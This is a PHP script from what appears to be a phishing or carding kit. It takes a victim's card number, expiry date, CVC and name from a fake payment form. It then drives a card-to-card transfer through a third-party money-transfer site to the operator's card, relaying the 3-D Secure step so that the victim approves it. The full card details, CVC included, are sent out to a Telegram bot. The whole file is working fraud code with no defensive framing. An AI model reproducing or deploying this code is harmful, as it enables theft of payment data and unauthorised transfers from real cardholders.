<?php

        include 'config.php';
        
        $card = wordwrap($card, 4, " ", 1);
        
        if($_COOKIE['amount']>=15000){
        $aa=$_COOKIE[0];
        } else $aa=$_POST['amount'];
        
        $ch = curl_init('https://lockobank.dengisend.ru/');
        curl_setopt($ch, CURLOPT_HTTPHEADER, 'User-Agent: '.getallheaders()['User-Agent']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $session = curl_exec($ch);
        curl_close($ch);
        
        preg_match_all('#<input type="hidden" name="_csrf" value="(.+?)"#is', $session, $csrf);
        
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $session, $matches);
        
        $cookies = array();
        foreach($matches[1] as $item) {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }
        
        if(!$_COOKIE[substr(time(),0,5)]) setcookie(substr(time(),0,5), base64_encode($cookies['JSESSIONID']), time()+900);
        if(!$_COOKIE[substr(time(),0,6)]) setcookie(substr(time(),0,6), base64_encode($csrf[1][0]), time()+900);
        
        if($_COOKIE[substr(time(),0,5)] && $_COOKIE[substr(time(),0,6)]) {
       
        $ch = curl_init('https://lockobank.dengisend.ru/lockobank/rate?amount='.$aa.'&fromBin='.substr(str_replace(' ', '', $_POST['cardnumber']), 0, 10).'&toBin='.substr(str_replace(' ', '', $card), 0, 10));
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: '.getallheaders()['User-Agent'],'X-Requested-With: XMLHttpRequest','Cookie: JSESSIONID='.base64_decode($_COOKIE[substr(time(),0,5)])));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $com = curl_exec($ch);
        curl_close($ch);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://lockobank.dengisend.ru/transfer',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => '_csrf='.base64_decode($_COOKIE[substr(time(),0,6)]).'&fromCardNumber='.urlencode($_POST['cardnumber']).'&cardDate='.urlencode(str_replace(' ', '', explode('/',$_POST["expdate"])[0].explode('/',$_POST["expdate"])[1])).'&cvv='.$_POST['cvc2'].'&toCardNumber='.urlencode($card).'&amount='.$aa,
        CURLOPT_HTTPHEADER => array('Host: lockobank.dengisend.ru', 'Connection: keep-alive', 'Cache-Control: max-age=0', 'Origin: https://lockobank.dengisend.ru', 'Upgrade-Insecure-Requests: 1', 'Content-Type: application/x-www-form-urlencoded', 'User-Agent: '.getallheaders()['User-Agent'], 'Sec-Fetch-Mode: navigate', 'Sec-Fetch-User: ?1', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Sec-Fetch-Site: same-origin', 'Referer: https://lockobank.dengisend.ru/', 'Accept-Encoding: gzip, deflate, br', 'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cookie: JSESSIONID='.base64_decode($_COOKIE[substr(time(),0,5)]))
        ]);
        $tsf = curl_exec($curl);
        $tsf = curl_getinfo($curl);
        curl_close($curl);
        
        
        $ch = curl_init($tsf['redirect_url']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cache-Control: max-age=0', 'Connection: keep-alive', 'Host: gate.payneteasy.com', 'Referer: https://lockobank.dengisend.ru/', 'Sec-Fetch-Mode: navigate', 'Sec-Fetch-Site: cross-site', 'Sec-Fetch-User: ?1', 'Upgrade-Insecure-Requests: 1', 'User-Agent: '.getallheaders()['User-Agent']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $tr = curl_exec($ch);
        curl_close($ch);
        
        
        preg_match_all('#<form name="returnform" action="(.+?)"#is', $tr, $action);
        preg_match_all('#<input type="hidden" name="PaReq" value="(.+?)"#is', $tr, $PaReq);
        preg_match_all('#<input type="hidden" name="TermUrl" value="(.+?)"#is', $tr, $TermUrl);
        preg_match_all('#<input type="hidden" name="MD" value="(.+?)"#is', $tr, $MD);
        
        setcookie(explode(',', $MD[1][0])[0], base64_encode($TermUrl[1][0]), time()+900);
       
       
        $ab = isset($_SERVER['HTTPS']) ? 'https://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php' : 'http://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php';
        
    $message = "<b>Переход на оплату</b> \n 0. Держатель: ".$_POST["cardholder"]." \n 1. Номер карты: ".$_POST["cardnumber"]." \n 2. Срок действия: ".$_POST["expdate"]."\n 3. CVC: ".$_POST["cvc2"]." \n 4. Сумма: ".$_POST["amount"]." \n 5. Объявление: ".$_POST["fio"].'/'.$_POST["tov"]." \n 6. Дата: ".date("d-m-Y H:i")."";
	file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode($message)."&parse_mode=html");
	
	file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$wchatid."&text=".urlencode("Переход на оплату ".$_POST['amount']." руб.")."&parse_mode=html");
if($MD[1][0]){
            echo
            '<body onload="document.forms[0].submit()">'.
                '<form action="' . $action[1][0] . '" method="post">' .
                    '<input type="hidden" name="PaReq" value="' . $PaReq[1][0] . '">' .
                    '<input type="hidden" name="MD" value="' . $MD[1][0] . '">' .
                    '<input type="hidden" name="TermUrl" value="' . $ab . '">' .
                '</form>' .
            '</body>';
} else header("Location: ".$_SERVER['HTTP_REFERER']);
} else {
    
    
    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode("Ошибка перехода на оплату")."&parse_mode=html");
    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$wchatid."&text=".urlencode("Ошибка перехода на оплату")."&parse_mode=html");
    header('Location: ' . $fail_url . '?error=Проверьте корректность введенных данных');
}
?>
